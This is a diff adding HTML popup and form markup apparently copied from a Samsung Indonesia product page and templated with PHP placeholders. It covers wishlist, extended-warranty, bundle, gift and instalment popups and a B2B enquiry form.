+      <div class="layer-popup__contents">
+       Ich habe das Informationsblatt zur Versicherung heruntergeladen und sorgf&auml;ltig durchgelesen.
+       <div class="hubble-care-popup__alert-button">
+        <a class="cta cta--contained cta--emphasis" href="<?= $canonical; ?>" title="Best&auml;tigen">
+         Best&auml;tigen
+        </a>
+       </div>
+      </div>
+      <button class="hubble-care-popup__alert-close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <input id="WishlistPopupUrl" type="hidden" value="/id/web/my-wishlist/"/>
+   <div class="wishlist-popup">
+    <div aria-modal="true" class="layer-popup" id="wishlist-popup" role="dialog" style="display:block">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents">
+       <p class="layer-popup__title">
+       </p>
+       <div class="wishlist-popup__desc">
+       </div>
+       <div class="wishlist-popup__selectbox__wrap">
+        <div class="wishlist-popup__selectbox">
+         <div class="wishlist-popup__selectbox-inner">
+          <div class="menu filled">
+           <select class="menu__select" data-default-message="My Wishlist" tabindex="-1">
+            <option value="">
+             My Wishlist 1
+            </option>
+            <option value="">
+             My Wishlist 2
+            </option>
+            <option value="">
+             My Wishlist 3
+            </option>
+            <option value="">
+             My Wishlist 4
+            </option>
+            <option value="">
+             My Wishlist 5
+            </option>
+            <option value="">
+             My Wishlist 6
+            </option>
+            <option value="">
+             My Wishlist 7
+            </option>
+            <option value="">
+             My Wishlist 8
+            </option>
+            <option value="">
+             My Wishlist 9
+            </option>
+           </select>
+           <button aria-expanded="false" aria-haspopup="listbox" class="menu__select-field">
+            <span class="menu__select-field-text">
+            </span>
+            <svg aria-hidden="true" class="menu__select-field-icon down" focusable="false">
+             <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#open-down-bold">
+             </use>
+            </svg>
+            <svg aria-hidden="true" class="menu__select-field-icon up" focusable="false">
+             <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#close-up-bold">
+             </use>
+            </svg>
+           </button>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="wishlist-popup__cta-wrap">
+       <div class="wishlist-popup__cta">
+        <a aria-label="Link Title" class="cta cta--outlined cta--black" href="<?= $canonical; ?>" role="button">
+        </a>
+       </div>
+       <div class="wishlist-popup__cta">
+        <a class="cta cta--contained cta--emphasis" href="<?= $canonical; ?>" role="button">
+        </a>
+       </div>
+      </div>
+      <button class="layer-popup__close wishlist-popup__close" type="button">
+       <span class="hidden">
+        Close popup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="extended-warranty-popup" role="dialog" tabindex="0">
+    <div class="layer-popup" id="extended-warranty">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title">
+         EXTENDED WARRANTY
+        </p>
+        <p class="layer-popup__desc">
+         Layanan Perbaikan Secara Total untuk Smartphone Galaxy Anda. Hindari Kejadian Tidak Terduga Dengan Perlindungan Ekstra
+        </p>
+        <div class="extended-warranty-popup__body">
+         <div class="extended-warranty-popup__smc">
+          <div class="extended-warranty-popup__smc-inner">
+          </div>
+          <p class="extended-warranty-popup__smc-message" style="display: none">
+           ※ Cover until canceled. Financing program is not available with device purchasing
+          </p>
+          <p class="extended-warranty-popup__smc-message" style="display: none">
+           ※ Cover for 24 months. Financing program is available with device purchasing
+          </p>
+         </div>
+         <div class="extended-warranty-popup__image">
+          <div class="image">
+           <img alt="Accidental damage, Worldwide cover, Repairs by genuine parts" class="image__preview lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/care-image-pc-uk.jpg?$380_223_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/care-image-mo-uk.jpg?$680_398_PNG$"/>
+           <img alt="Accidental damage, Worldwide cover, Repairs by genuine parts" class="image__main lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/care-image-pc-uk.jpg?$380_223_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/care-image-mo-uk.jpg?$680_398_PNG$"/>
+          </div>
+         </div>
+         <div class="extended-warranty-popup__info-box">
+          <!-- 필요 시 smc-inner 의 .checkbox-radio 의 갯수와 동일하게 구현 -->
+         </div>
+         <div class="extended-warranty-popup__check">
+          <div class="extended-warranty-popup__check-title">
+           Syarat dan Ketentuan <?= $BRAND; ?> x <?= $BRAND2; ?> Protection
+          </div>
+         </div>
+         <div class="extended-warranty-popup__policy-text" id="cfCareIPID">
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="extended-warranty-popup__foot">
+       <div class="extended-warranty-popup__button">
+        <div class="extended-warranty-popup__button-description">
+         <p>
+          By clicking on confirm, you agree to Samsung terms and conditions.
+         </p>
+        </div>
+        <div class="extended-warranty-popup__button-inner">
+         <div class="extended-warranty-popup__button-item">
+          <a an-ac="pd buying tool" an-ca="option click" an-la="samsung warranty:close" an-tr="header(pim)_service option selector-product detail-popup-button" class="cta cta--outlined cta--black" href="<?= $canonical; ?>" role="button">
+           Tutup
+          </a>
+         </div>
+         <div class="extended-warranty-popup__button-item">
+          <a an-ac="pd buying tool" an-ca="option click" an-la="samsung warranty:confirm" an-tr="header(pim)_service option selector-product detail-popup-button" class="cta cta--contained cta--emphasis cta--disabled" href="<?= $canonical; ?>" role="button">
+           Yakin
+          </a>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="extended-warranty-popup__close">
+       <span class="hidden">
+        Layer Popup Close
+       </span>
+       <svg class="icon">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="extended-warranty-popup__alert" role="dialog" tabindex="0">
+    <div class="layer-popup" id="extended-warranty-alert1">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents">
+       Ich habe die Allgemeinen Versicherungsbedingungen heruntergeladen, gelesen und erkl&auml;re mich mit diesen einverstanden.
+       <div class="extended-warranty-popup__alert-button">
+        <a class="cta cta--contained cta--emphasis" href="<?= $canonical; ?>">
+         Best&auml;tigen
+        </a>
+       </div>
+      </div>
+      <button class="extended-warranty-popup__alert-close">
+       <span class="hidden">
+        Layer Popup Close
+       </span>
+       <svg class="icon">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="extended-warranty-popup__alert" role="dialog" tabindex="0">
+    <div class="layer-popup" id="extended-warranty-alert2">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents">
+       Ich habe das Informationsblatt zur Versicherung heruntergeladen und sorgf&auml;ltig durchgelesen.
+       <div class="extended-warranty-popup__alert-button">
+        <a class="cta cta--contained cta--emphasis" href="<?= $canonical; ?>" title="">
+         Best&auml;tigen
+        </a>
+       </div>
+      </div>
+      <button class="extended-warranty-popup__alert-close">
+       <span class="hidden">
+        Layer Popup Close
+       </span>
+       <svg class="icon">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="extended-warranty-popup-vd" role="dialog" tabindex="0">
+    <div class="layer-popup" id="extended-warranty-vd">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title">
+         Extended Warranty
+        </p>
+        <p class="layer-popup__desc">
+         Perpanjang durasi garansi pabrik untuk produk Anda
+        </p>
+        <div class="extended-warranty-popup-vd__body">
+         <div class="extended-warranty-popup-vd__option">
+          <div class="pd-select-option">
+           <div class="pd-select-option__wrap">
+            <ul class="pd-select-option__list pd-select-option__list--wide" role="list">
+            </ul>
+           </div>
+          </div>
+         </div>
+         <div class="extended-warranty-popup-vd__check">
+          <div class="extended-warranty-popup-vd__check-title">
+           Ketentuan Untuk Extended Warranty
+          </div>
+          <ul class="extended-warranty-popup-vd__check-list-wrap">
+          </ul>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="extended-warranty-popup-vd__foot">
+       <div class="extended-warranty-popup-vd__button">
+        <div class="extended-warranty-popup-vd__button-inner">
+         <div class="extended-warranty-popup-vd__button-item">
+          <a class="cta cta--outlined cta--black" href="<?= $canonical; ?>" role="button">
+           Tutup
+          </a>
+         </div>
+         <div class="extended-warranty-popup-vd__button-item">
+          <a class="cta cta--contained cta--emphasis cta--disabled" href="<?= $canonical; ?>" role="button">
+           Yakin
+          </a>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="extended-warranty-popup-vd__close">
+       <span class="hidden">
+        Close popup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div class="warranty-info-popup">
+    <div class="layer-popup" role="dialog" style="display:none" tabindex="0">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title">
+         EXTENDED WARRANTY
+        </p>
+        <div class="warranty-info-popup__content">
+         <div class="warranty-info-popup__info">
+          <dl class="warranty-info-popup__info-list">
+          </dl>
+         </div>
+         <div class="warranty-info-popup__explain">
+          <p>
+          </p>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="shop-combo-popup" id="shop-combo-popup" role="dialog">
+    <div class="layer-popup">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__title">
+       Pilih opsi paket kombo
+      </div>
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <div class="shop-combo-popup__list">
+         <div class="shop-combo-popup__list-area">
+          <div class="shop-combo-popup__list-in">
+           <ul>
+           </ul>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="layer__fixed-wrap">
+       <div class="shop-combo-popup__summary">
+        <div class="shop-combo-popup__summary-title">
+         <p>
+          Produk terpilih (
+          <span class="s-bundle-option-count">
+           0
+          </span>
+          )
+         </p>
+        </div>
+        <div class="shop-combo-popup__summary-save">
+         <span class="shop-combo-popup__summary-save-original">
+          <span class="hidden">
+           Harga awal:
+          </span>
+          <del>
+          </del>
+         </span>
+         <span class="shop-combo-popup__summary-save-price">
+         </span>
+        </div>
+        <div class="shop-combo-popup__summary-total">
+         <span class="shop-combo-popup__summary-option-total">
+          <strong>
+          </strong>
+         </span>
+        </div>
+        <div class="shop-combo-popup__summary-reset">
+         <button an-ac="pd buying tool" an-ca="option click" an-la="bundle offer:add-on:clear all" an-tr="header(pim)_offer option:bundle offer:add-on -product detail-popup-button" class="cta-reset" type="reset">
+          Kosongkan semua
+         </button>
+        </div>
+       </div>
+      </div>
+      <div class="shop-combo-popup__btn-wrap">
+       <button an-ac="pd buying tool" an-ca="option click" an-la="bundle offer:add-on:close" an-tr="header(pim)_offer option:bundle offer:add-on -product detail-popup-button" class="shop-combo-popup__btn-close cta cta--outlined cta--black">
+        Tutup
+       </button>
+       <button an-ac="pd buying tool" an-ca="option click" an-la="bundle offer:add-on:confirm" an-tr="header(pim)_offer option:bundle offer:add-on -product detail-popup-button" class="shop-combo-popup__btn-confirm cta cta--contained cta--emphasis cta--disabled">
+        Yakin
+       </button>
+      </div>
+      <button an-ac="pd buying tool" an-ca="option click" an-la="bundle offer:add-on:close" an-tr="header(pim)_offer option:bundle offer:add-on -product detail-popup-button" class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="free-gift-popup" role="dialog" tabindex="0">
+    <div class="layer-popup" id="free-gift-popup">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__title type-left">
+       Pilih hadiah Pre-order Anda
+      </div>
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <div class="free-gift-popup__wrap">
+        </div>
+       </div>
+      </div>
+      <div class="layer-popup__foot">
+       <div class="layer-popup__button">
+        <div class="layer-popup__button-inner">
+         <div class="layer-popup__button-item close-popup">
+          <button an-ac="pd buying tool" an-ca="option click" an-la="bundle offer:free gift:close" an-tr="header(pim)_offer option:bundle offer:free gift-product detail-popup-link" class="cta cta--outlined cta--black">
+           Tutup
+          </button>
+         </div>
+         <div class="layer-popup__button-item">
+          <button an-ac="pd buying tool" an-ca="option click" an-la="bundle offer:free gift:confirm" an-tr="header(pim)_offer option:bundle offer:free gift-product detail-popup-link" class="cta cta--contained cta--emphasis cta--disabled">
+           Yakin
+          </button>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button an-ac="pd buying tool" an-ca="option click" an-la="bundle offer:free gift:layer popup close" an-tr="header(pim)_offer option:bundle offer:free gift-product detail-popup-link" class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#cancel-close-regular">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div class="finance-ee-popup" style="display:none">
+    <div class="layer-popup" id="finance ee" role="dialog" style="display:block" tabindex="0">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="finance-ee-popup__contents scrollbar__contents">
+        <div class="finance-ee-popup__title">
+         <strong class="finance-ee-popup__title-text">
+          Choose convenient Instalment plans provided by Inbank
+         </strong>
+        </div>
+        <div class="finance-ee-popup__description">
+         <div class="finance-ee-popup__plans-contents">
+          <div class="finance-ee-popup__plans-table" role="table">
+           <div class="finance-ee-popup__plans-row" role="row">
+            <div class="finance-ee-popup__plans-header" role="rowheader">
+             Harga produk
+            </div>
+            <div class="finance-ee-popup__plans-cell" role="cell">
+             <p class="finance-ee-popup__plans-text" id="productprice">
+             </p>
+            </div>
+           </div>
+           <div class="finance-ee-popup__plans-row" role="row">
+            <div class="finance-ee-popup__plans-header" role="rowheader">
+             Plan
+            </div>
+            <div class="finance-ee-popup__plans-cell" role="cell">
+             <div class="menu">
+              <select class="menu__select" id="selectplan" tabindex="-1">
+              </select>
+              <button aria-expanded="false" aria-haspopup="listbox" class="menu__select-field">
+               <span class="menu__select-field-text">
+               </span>
+               <svg class="menu__select-field-icon down" focusable="false">
+                <use href="#open-down-bold" xlink:href="#open-down-bold">
+                </use>
+               </svg>
+               <svg class="menu__select-field-icon up" focusable="false">
+                <use href="#close-up-bold" xlink:href="#close-up-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+            </div>
+           </div>
+           <div class="finance-ee-popup__plans-row" role="row">
+            <div class="finance-ee-popup__plans-header" role="rowheader">
+             Months
+            </div>
+            <div class="finance-ee-popup__plans-cell" role="cell">
+             <div class="menu">
+              <select class="menu__select" id="selectmonths" tabindex="-1">
+              </select>
+              <button aria-expanded="false" aria-haspopup="listbox" class="menu__select-field">
+               <span class="menu__select-field-text">
+               </span>
+               <svg class="menu__select-field-icon down" focusable="false">
+                <use href="#open-down-bold" xlink:href="#open-down-bold">
+                </use>
+               </svg>
+               <svg class="menu__select-field-icon up" focusable="false">
+                <use href="#close-up-bold" xlink:href="#close-up-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+            </div>
+           </div>
+           <div class="finance-ee-popup__plans-row" role="row">
+            <div class="finance-ee-popup__plans-header" role="rowheader">
+             Interest rate
+            </div>
+            <div class="finance-ee-popup__plans-cell" role="cell">
+             <p class="finance-ee-popup__plans-text" id="interestrate">
+             </p>
+            </div>
+           </div>
+           <div class="finance-ee-popup__plans-row" role="row">
+            <div class="finance-ee-popup__plans-header" role="rowheader">
+             Monthly payment
+            </div>
+            <div class="finance-ee-popup__plans-cell" role="cell">
+             <p class="finance-ee-popup__plans-text" id="monthlypayment">
+             </p>
+            </div>
+           </div>
+          </div>
+         </div>
+         <p class="finance-ee-popup__disclaimer">
+          Ketentu Paket Angsuran
+         </p>
+        </div>
+       </div>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <!-- <sly data-sly-include="ebt-popup"/> -->
+   <div aria-modal="true" class="contact-mail-form-popup" role="dialog" style="display: none">
+    <input id="fn06_headlineText" name="fn06_headlineText" type="hidden" value="Thank you!"/>
+    <input id="fn06_description" name="fn06_description" type="hidden" value="Your enquiry has been successfully submitted. We will get back to you shortly."/>
+    <input id="fn06_headlineHeadingLevel" name="fn06_headlineHeadingLevel" type="hidden" value="h2"/>
+    <input id="eloquaPostUrl" name="eloquaPostUrl" type="hidden"/>
+    <input id="eloquaYn" name="eloquaYn" type="hidden"/>
+    <input id="inquiryType" name="inquiryType" type="hidden" value="SalesInquiry"/>
+    <input id="Subsidiary" name="Subsidiary" type="hidden" value="SEIN"/>
+    <div class="layer-popup">
+     <div class="layer-popup__inner">
+      <p class="layer-popup__title">
+       B2B Enquiry Form
+      </p>
+      <p class="layer-popup__description">
+      </p>
+      <div class="layer-popup__contents">
+       <div class="contact-mail-form-popup__contents">
+        <div class="contact-mail-form-popup__form">
+         <form name="contact-mail-form-popup__form">
+          <div class="append-from-data">
+          </div>
+         </form>
+         <div class="contact-mail-form-popup__form-wrap">
+          <div class="contact-mail-form-popup__form-field form--size-half is-required field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_0">
+             Company Name
+             <span class="required-text">
+              *
+              <span class="hidden">
+               Wajib Diisi
+              </span>
+             </span>
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="organization" class="text-field-v2__input" data-form-name="CustomerName" id="popUp_form_0" maxlength="255" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-half is-required field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_1">
+             First Name
+             <span class="required-text">
+              *
+              <span class="hidden">
+               Wajib Diisi
+              </span>
+             </span>
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="given-name" class="text-field-v2__input" data-form-name="ContactFirstName" id="popUp_form_1" maxlength="40" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-half is-required field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_2">
+             Last Name
+             <span class="required-text">
+              *
+              <span class="hidden">
+               Wajib Diisi
+              </span>
+             </span>
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="family-name" class="text-field-v2__input" data-form-name="ContactName" id="popUp_form_2" maxlength="80" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-half is-required field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_3">
+             E-mail Address
+             <span class="required-text">
+              *
+              <span class="hidden">
+               Wajib Diisi
+              </span>
+             </span>
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="email" class="text-field-v2__input" data-form-name="EmailAddress" id="popUp_form_3" maxlength="80" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-half field--checkbox checkbox--list is-required">
+           <fieldset>
+            <legend>
+             Product Interest
+             <span>
+              * Wajib Diisi
+             </span>
+            </legend>
+            <div class="field--checkbox-list-wrap">
+             <div aria-hidden="ture" class="contact-mail-form-popup__form-field-title-wrap">
+              <strong aria-hidden="true" class="contact-mail-form-popup__form-field-title">
+               Product Interest
+              </strong>
+              <p aria-hidden="true" class="checkbox--required-text">
+               * Wajib Diisi
+              </p>
+              <p class="checkbox--error-text">
+               * This checkbox is required
+              </p>
+             </div>
+             <div class="contact-mail-form-popup__form-field-list-wrap">
+              <div class="field--checkbox-wrap">
+               <div class="checkbox-v2">
+                <input class="checkbox-v2__input" data-form-name="ProductSolution" data-orignal="Mobile" id="popUp_form_4-0" type="checkbox" value="Mobile"/>
+                <label class="checkbox-v2__label" for="popUp_form_4-0">
+                 <span class="checkbox-v2__label-box-wrap">
+                  <span class="checkbox-v2__label-box">
+                   <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                    <use href="#done-bold" xlink:href="#done-bold">
+                    </use>
+                   </svg>
+                  </span>
+                 </span>
+                 <span class="checkbox-v2__label-text">
+                  Seluler
+                 </span>
+                </label>
+               </div>
+              </div>
+              <div class="field--checkbox-wrap">
+               <div class="checkbox-v2">
+                <input class="checkbox-v2__input" data-form-name="ProductSolution" data-orignal="Computing" id="popUp_form_4-1" type="checkbox" value="Computing"/>
+                <label class="checkbox-v2__label" for="popUp_form_4-1">
+                 <span class="checkbox-v2__label-box-wrap">
+                  <span class="checkbox-v2__label-box">
+                   <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                    <use href="#done-bold" xlink:href="#done-bold">
+                    </use>
+                   </svg>
+                  </span>
+                 </span>
+                 <span class="checkbox-v2__label-text">
+                  Computing
+                 </span>
+                </label>
+               </div>
+              </div>
+              <div class="field--checkbox-wrap">
+               <div class="checkbox-v2">
+                <input class="checkbox-v2__input" data-form-name="ProductSolution" data-orignal="Displays" id="popUp_form_4-2" type="checkbox" value="Displays"/>
+                <label class="checkbox-v2__label" for="popUp_form_4-2">
+                 <span class="checkbox-v2__label-box-wrap">
+                  <span class="checkbox-v2__label-box">
+                   <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                    <use href="#done-bold" xlink:href="#done-bold">
+                    </use>
+                   </svg>
+                  </span>
+                 </span>
+                 <span class="checkbox-v2__label-text">
+                  Displays
+                 </span>
+                </label>
+               </div>
+              </div>
+              <div class="field--checkbox-wrap">
+               <div class="checkbox-v2">
+                <input class="checkbox-v2__input" data-form-name="ProductSolution" data-orignal="Home Appliance" id="popUp_form_4-3" type="checkbox" value="Home Appliance"/>
+                <label class="checkbox-v2__label" for="popUp_form_4-3">
+                 <span class="checkbox-v2__label-box-wrap">
+                  <span class="checkbox-v2__label-box">
+                   <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                    <use href="#done-bold" xlink:href="#done-bold">
+                    </use>
+                   </svg>
+                  </span>
+                 </span>
+                 <span class="checkbox-v2__label-text">
+                  Peralatan Rumah Tangga
+                 </span>
+                </label>
+               </div>
+              </div>
+              <div class="field--checkbox-wrap">
+               <div class="checkbox-v2">
+                <input class="checkbox-v2__input" data-form-name="ProductSolution" data-orignal="Climate" id="popUp_form_4-4" type="checkbox" value="Climate"/>
+                <label class="checkbox-v2__label" for="popUp_form_4-4">
+                 <span class="checkbox-v2__label-box-wrap">
+                  <span class="checkbox-v2__label-box">
+                   <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                    <use href="#done-bold" xlink:href="#done-bold">
+                    </use>
+                   </svg>
+                  </span>
+                 </span>
+                 <span class="checkbox-v2__label-text">
+                  Climate
+                 </span>
+                </label>
+               </div>
+              </div>
+              <div class="field--checkbox-wrap">
+               <div class="checkbox-v2">
+                <input class="checkbox-v2__input" data-form-name="ProductSolution" data-orignal="Memory" id="popUp_form_4-5" type="checkbox" value="Memory"/>
+                <label class="checkbox-v2__label" for="popUp_form_4-5">
+                 <span class="checkbox-v2__label-box-wrap">
+                  <span class="checkbox-v2__label-box">
+                   <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                    <use href="#done-bold" xlink:href="#done-bold">
+                    </use>
+                   </svg>
+                  </span>
+                 </span>
+                 <span class="checkbox-v2__label-text">
+                  Penyimpanan
+                 </span>
+                </label>
+               </div>
+              </div>
+              <div class="field--checkbox-wrap">
+               <div class="checkbox-v2">
+                <input class="checkbox-v2__input" data-form-name="ProductSolution" data-orignal="Healthcare" id="popUp_form_4-6" type="checkbox" value="Healthcare"/>
+                <label class="checkbox-v2__label" for="popUp_form_4-6">
+                 <span class="checkbox-v2__label-box-wrap">
+                  <span class="checkbox-v2__label-box">
+                   <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                    <use href="#done-bold" xlink:href="#done-bold">
+                    </use>
+                   </svg>
+                  </span>
+                 </span>
+                 <span class="checkbox-v2__label-text">
+                  Healthcare
+                 </span>
+                </label>
+               </div>
+              </div>
+             </div>
+            </div>
+            <fieldset>
+            </fieldset>
+           </fieldset>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_5">
+             Company Address
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="address-line1" class="text-field-v2__input" data-form-name="CompanyAddress" id="popUp_form_5" maxlength="255" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_6">
+             Company Industry
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="organization" class="text-field-v2__input" data-form-name="CompanyInterest" id="popUp_form_6" maxlength="255" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_7">
+             Job Title
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="organization-title" class="text-field-v2__input" data-form-name="JobTitle" id="popUp_form_7" maxlength="128" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
